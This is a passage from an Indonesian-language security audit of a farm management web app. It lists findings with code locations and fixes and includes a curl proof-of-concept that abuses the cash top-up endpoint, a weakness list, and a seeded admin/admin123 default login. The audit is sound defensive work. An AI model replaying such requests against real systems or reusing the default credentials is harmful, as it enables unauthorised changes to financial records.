curl -X POST -H "Authorization: Bearer $TOKEN_PETERNAKAN" -H 'Content-Type: application/json' \
  -d '{"tgl":"2026-10-01","arah":"masuk","kategori":"topup_bo","jumlah":10000000,"keterangan":"top up"}' https://TARGET/api/kas
# saldo_bo di /api/bo/ringkasan turun 10 juta
```

**Rekomendasi:** top up dicatat di sisi BO (sumber kebenaran) lalu otomatis membuat kas masuk kandang, atau gunakan status `pending → disetujui` oleh user `bokas`. Untuk penghapusan lintas unit, wajibkan menu kedua unit atau role owner.

---

### M-06 — Toolchain Go usang: 26 vulnerability reachable

**Severity: Medium.** `govulncheck` menemukan 26 vuln yang **benar-benar terjangkau** dari kode (25 stdlib go1.26.0, 1 modul), ditambah 20 di package yang diimpor dan 3 di modul yang tidak terpanggil.

**Lokasi:** `backend/go.mod:3` (`go 1.26.0`, toolchain lokal `go1.26.0`), `backend/go.mod:29` (`quic-go v0.59.0`)

Yang paling relevan untuk server HTTP publik ini:

| ID | Ringkas | Fixed in |
|---|---|---|
| GO-2026-6617 | HTTP/2 server crash (HPACK encoder race) | go1.26.9 |
| GO-2026-6613 | HTTP/1 desync setelah 2xx CONNECT | go1.26.9 |
| GO-2026-6612 / 6611 / 6603 | HTTP/2: flow control, CPU, memory exhaustion (DoS) | go1.26.9 |
| GO-2026-6089 | ReadHeaderTimeout tidak diterapkan pada h2c check | go1.26.6 |
| GO-2026-6608 | Memory limit bypass parsing MIME header | go1.26.9 |
| GO-2026-6809, 5037, 4947, 4946, 4866, 4600, 4599 | crypto/x509 | ≤ go1.26.10 |
| GO-2026-6607, 6090, 5856, 4870 | crypto/tls | ≤ go1.26.9 |
| GO-2026-5676 | quic-go HTTP/3 QPACK memory exhaustion | quic-go v0.59.1 |

Vuln TLS/x509/HTTP/2 hanya berdampak bila Go melayani TLS/h2 langsung; di belakang reverse proxy dampaknya lebih kecil (**Perlu verifikasi** arsitektur deployment). Sebagian besar adalah DoS.

**Rekomendasi:** build dengan Go ≥ 1.26.10, `go get github.com/quic-go/quic-go@v0.59.1` (atau upgrade gin), `go mod tidy`, dan jalankan `govulncheck` di CI.

---

### L-01 — CORS wildcard

**Severity: Low.** Karena autentikasi memakai header `Authorization` (bukan cookie) dan tidak ada `Allow-Credentials`, origin lain tidak bisa memakai sesi korban. Tetapi wildcard menghilangkan lapisan pertahanan bila nanti pindah ke cookie, dan memudahkan situs pihak ketiga memanggil `/api/login` (brute force dari browser korban).

**Lokasi:** `backend/internal/middleware/cors.go:6`
```go
c.Header("Access-Control-Allow-Origin", "*")
```
**Rekomendasi:**
```go
allowed := map[string]bool{os.Getenv("FRONTEND_ORIGIN"): true}
if o := c.GetHeader("Origin"); allowed[o] {
    c.Header("Access-Control-Allow-Origin", o)
    c.Header("Vary", "Origin")
}
```

---

### L-02 — Pesan error SQL internal dikirim ke klien

**Severity: Low.**

**Lokasi:** `sapi.go:14`, `pakan.go:14`, `produksi.go:13,57`, `penjualan.go:14`, `melk_susu.go:14`, `melk_keju.go:14`, `melk_kas.go:20`, `kas_kandang.go:20`, `investor.go:19,96`, `backoffice.go:76`
```go
c.JSON(500, gin.H{"error": err.Error()})
```
**Dampak:** membocorkan nama tabel/kolom, versi/host MySQL, atau `dial tcp 10.x.x.x:3306` saat DB down.
**Rekomendasi:** `log.Printf("ListSapi: %v", err); c.JSON(500, gin.H{"error": "Terjadi kesalahan server"})`.

---

### L-03 — Hardening Gin/HTTP server

**Severity: Low.**

**Lokasi:** `backend/internal/routes/routes.go:11`, `backend/main.go:23`
```go
r := gin.Default()
...
log.Fatal(routes.Setup().Run(":" + cfg.Port))
```
- Mode debug aktif kecuali `GIN_MODE=release` di-set (hanya didokumentasikan di README).
- `SetTrustedProxies` tidak dipanggil → Gin mempercayai semua proxy; `ClientIP()` bisa dipalsukan via `X-Forwarded-For` (relevan begitu ada rate limit/log IP).
- `Run()` = `http.ListenAndServe` tanpa `ReadHeaderTimeout`/`ReadTimeout`/`WriteTimeout`/`IdleTimeout` → slowloris.
- Tidak ada batas ukuran body JSON → request besar memakan memori.
- Tidak ada security header API (`X-Content-Type-Options: nosniff`, `Cache-Control: no-store` untuk data keuangan).

**Rekomendasi:**
```go
gin.SetMode(gin.ReleaseMode)
r := gin.New(); r.Use(gin.Logger(), gin.Recovery())
r.SetTrustedProxies([]string{"127.0.0.1"})
r.Use(func(c *gin.Context) {
    c.Request.Body = http.MaxBytesReader(c.Writer, c.Request.Body, 1<<20)
    c.Header("X-Content-Type-Options", "nosniff")
    c.Header("Cache-Control", "no-store")
    c.Next()
})
srv := &http.Server{Addr: ":" + cfg.Port, Handler: r,
    ReadHeaderTimeout: 5 * time.Second, ReadTimeout: 15 * time.Second,
    WriteTimeout: 30 * time.Second, IdleTimeout: 60 * time.Second}
log.Fatal(srv.ListenAndServe())
```

---

### L-04 — Token di `localStorage` dan tidak ada CSP / security header frontend

**Severity: Low** (tidak ditemukan XSS saat ini; ini defense-in-depth).

**Lokasi:** `frontend/src/api/auth.js:14`, `frontend/src/api/client.js:7`, `frontend/index.html` (tanpa CSP), tidak ada konfigurasi hosting.
```js
localStorage.setItem('token', d.token)
```
**Dampak:** bila suatu saat ada XSS (mis. dependency pihak ketiga tercemar), token super_admin langsung dapat dicuri dan dipakai 24 jam (M-01). Tanpa `X-Frame-Options`/`frame-ancestors`, aplikasi bisa di-iframe (clickjacking tombol Hapus).
**Rekomendasi:** pasang header di web server frontend:
```
Content-Security-Policy: default-src 'self'; connect-src 'self' https://api.domain-kamu.com; frame-ancestors 'none'; object-src 'none'; base-uri 'self'
Strict-Transport-Security: max-age=31536000; includeSubDomains
X-Content-Type-Options: nosniff
Referrer-Policy: same-origin
```
Opsional jangka panjang: pindah ke cookie `HttpOnly; Secure; SameSite=Strict` (+ proteksi CSRF dan CORS spesifik).

---

### L-05 — Enumerasi username via timing login

**Severity: Low.**

**Lokasi:** `backend/internal/services/auth.go:41-44`
```go
err := database.DB.QueryRow("SELECT password_hash, role FROM users WHERE username=?", username).Scan(&hash, &role)
if err != nil || bcrypt.CompareHashAndPassword([]byte(hash), []byte(password)) != nil {
```
Username tidak ada → bcrypt tidak dijalankan → respons ~puluhan ms lebih cepat. Pesan error sudah seragam (baik).
**Rekomendasi:** jalankan `bcrypt.CompareHashAndPassword(dummyHash, ...)` saat user tidak ditemukan.

---

### L-06 — `Content-Disposition` dibangun dari query tak tervalidasi

**Severity: Low.**

**Lokasi:** `backend/internal/controllers/backoffice.go:15-24,132`
```go
c.Header("Content-Disposition", "attachment; filename=laporan_"+d+"_"+s+".csv")
```
`dari`/`sampai` langsung dari query. CRLF dinetralkan oleh `net/http`, jadi tidak ada header injection, tetapi `;`/`"` memungkinkan menyuntik parameter (`filename*=...`) dan nilainya juga masuk ke `BETWEEN` tanpa validasi. Dampak kecil karena endpoint butuh token owner dan frontend memakai `a.download` sendiri.
**Rekomendasi:** validasi `time.Parse("2006-01-02", v)` untuk keduanya (sekaligus menutup bagian M-04) dan pakai `mime.FormatMediaType("attachment", map[string]string{"filename": name})`.

---

### L-07 — Error bcrypt diabaikan; cost 10

**Severity: Low.**

**Lokasi:** `backend/internal/controllers/user.go:41`, `backend/internal/services/auth.go:60`
```go
h, _ := bcrypt.GenerateFromPassword([]byte(in.Password), 10)
```
`x/crypto v0.58` mengembalikan `ErrPasswordTooLong` untuk password > 72 byte → `h` nil → akun tersimpan dengan `password_hash` kosong (tidak bisa login; bukan bypass, tapi respons tetap `ok:true`). Cost 10 masih wajar namun 12 lebih disarankan untuk 2026.
**Rekomendasi:** batasi panjang 10–72, cek error, cost 12.

---

### L-08 — `.gitignore` tidak melindungi file rahasia

**Severity: Low.** Saat ini **tidak ada** secret nyata ter-commit (riwayat git hanya 1 commit, sudah diperiksa). Tetapi:
- Tidak ada `.gitignore` di root/`backend` → `backend/.env`, dump `*.sql` backup, atau binary build akan ikut ter-commit dengan `git add .`.
- `frontend/.gitignore` tidak mengabaikan `.env` (hanya `*.local`). Untuk frontend ini hanya `VITE_API_URL` (bukan rahasia), tapi pola ini berbahaya bila nanti ada variabel lain.

**Rekomendasi:** root `.gitignore`:
```
.env
.env.*
!.env.example
*.sql.gz
backup/
backend/rejeki-baru-farm*
```

---

### I-01 — Password seed ditulis ke log; seed berjalan ulang bila tabel kosong

**Lokasi:** `backend/internal/services/auth.go:56-62`. Log `admin / admin123` bisa terkumpul di log agregator. Error `QueryRow`/`Exec` diabaikan; bila tabel `users` suatu saat kosong (restore parsial), akun default muncul kembali. Ikut terselesaikan oleh rekomendasi H-01.

### I-02 — Tidak ada konfigurasi backup, Dockerfile, CI, maupun HTTPS

Tidak ditemukan di repo: skrip/jadwal backup MySQL (beserta enkripsinya), Dockerfile backend/frontend (tidak bisa menilai user root di container aplikasi), pipeline CI, maupun konfigurasi TLS/reverse proxy. **Perlu verifikasi di server**: apakah API dilayani via HTTPS (token Bearer dikirim plain bila HTTP), apakah volume `dbdata` dibackup dan disimpan di luar web root.

### I-03 — Pengecekan role export di frontend dari `localStorage`

**Lokasi:** `frontend/src/pages/backoffice/RekapBO.jsx:10,44`. Tombol export hanya disembunyikan; user dapat mengubah `localStorage.user.role`. **Tidak dapat dieksploitasi** karena backend menegakkan `Allow("super_admin","owner")` + `Akses("bo")` (`routes/backoffice.go:20-21`). Dicatat agar tidak ada yang mengandalkan pola ini untuk fitur baru.

---

## 4. Hal yang Sudah Dicek dan Aman

| Area | Hasil |
|---|---|
| SQL injection | Semua query memakai placeholder `?`. Satu-satunya konkatenasi (`melk_rekap.go:18-19`) memakai nilai konstan `melk_susu/liter`, `melk_keju/jumlah_gram`. `DATE_FORMAT(tgl,?)` (`produksi.go:54`) diparameterisasi. Tidak ada `ORDER BY`/kolom dari input user. |
| Mass assignment | Tidak ada ORM. Semua INSERT/UPDATE menyebut kolom eksplisit; `role` di `AddUser` divalidasi whitelist dan endpoint hanya untuk super_admin; `SaveSapi` mengabaikan `id`/`umur_bulan` dari body. |
| Otorisasi per route | Setiap route data punya `Akses(...)`; menu dibaca dari DB setiap request sehingga pencabutan menu langsung berlaku. `/api/users` dibatasi `Allow("super_admin")`. Group `/bo` kedua dengan `Allow` hanya berlaku untuk `/bo/export` (perilaku Gin group benar). |
| IDOR | Single-tenant tanpa kepemilikan per user — tidak ada data milik user lain yang bisa diakses lewat ganti ID di luar hak menu. `/api/me` hanya mengembalikan data diri sendiri. |
| Proteksi data otomatis | `DelKas`/`DelKasMelk` menolak menghapus baris dengan `ref_tabel` (otomatis); `DelMelkSusu` hanya menghapus `arah='keluar'`; `SetMenus` tidak bisa mengubah super_admin; `DelUser` mencegah hapus diri sendiri. |
| JWT | Algoritma dikunci `HS256` (`WithValidMethods`), `exp` divalidasi oleh jwt/v5, tidak ada `alg:none`/confusion. |
| Password | bcrypt; `password_hash` tidak pernah dikembalikan di response (`ListUsers` hanya id/username/role/menus). Pesan login gagal seragam. |
| XSS | Tidak ada `dangerouslySetInnerHTML`, `innerHTML`, `eval`, atau `href` dinamis; semua nilai (nama sapi, keterangan, pembeli, kontak investor) dirender via JSX yang di-escape React. |
| CSRF | Tidak relevan: tidak ada cookie sesi, token dikirim via header `Authorization`. |
| Open redirect | Tidak ada redirect berbasis parameter (`location.reload()` saja). |
| Secret di bundle client | Hanya `VITE_API_URL` (bukan rahasia). Tidak ada API key hardcoded di frontend. |
| Upload / path traversal | Tidak ada upload, tidak ada operasi file system; export dibuat in-memory. |
| Pagination | List dibatasi `LIMIT 100`/`31`/`24`; kas per bulan. Rentang export/laba rugi bebas, tetapi hanya untuk owner/super_admin. |
| Logging | Logger Gin mencatat path+query saja; tidak ada password/token di URL atau log (kecuali I-01). |
| Race condition | Operasi multi-tabel memakai transaksi; tidak ada pola read-modify-write stok (stok dihitung `SUM`). Masalahnya ada di validasi (M-04), bukan race. |
| Perhitungan | Total penjualan, saldo, stok, dan laba rugi dihitung di backend; frontend tidak mengirim total. |
| npm audit | 0 vulnerability (168 package). |
| go vet | Bersih. |
| Riwayat git | 1 commit; tidak ada `.env` atau kredensial selain default yang sudah dilaporkan (C-01, H-01, H-03). |

---

## 5. Urutan Prioritas Perbaikan

1. **Sebelum online / segera:**
   1. C-01 — wajibkan `JWT_SECRET` kuat, gagal-start bila kosong.
   2. H-03 — bind MySQL ke `127.0.0.1` (atau tanpa port publish), password kuat, user DB khusus aplikasi.
   3. H-01 — hapus/ganti akun `admin`, tambahkan fitur ganti & reset password.
   4. H-02 — rate limit login + password minimal 10-12 karakter.
   5. M-06 — rebuild dengan Go ≥ 1.26.10 dan update quic-go.
2. **Minggu ini:**
   6. M-01 — role dari DB + `token_version` untuk revoke sesi.
   7. H-04 — tabel `audit_log`, `created_by`, soft delete untuk tabel keuangan; siapkan backup terjadwal (I-02).
   8. M-03 — tangani semua error DB/transaksi.
   9. M-02 — netralkan formula di export CSV.
3. **Berikutnya:**
   10. M-04 — validasi tanggal/angka/relasi terpusat; set `sql_mode` strict.
   11. M-05 — konfirmasi alur bisnis top up & hapus lintas unit, lalu terapkan approval.
   12. L-03, L-04 — hardening server (release mode, trusted proxies, timeout, body limit) dan security header/CSP.
   13. L-01, L-02, L-05, L-06, L-07, L-08, I-01 — perbaikan kecil.
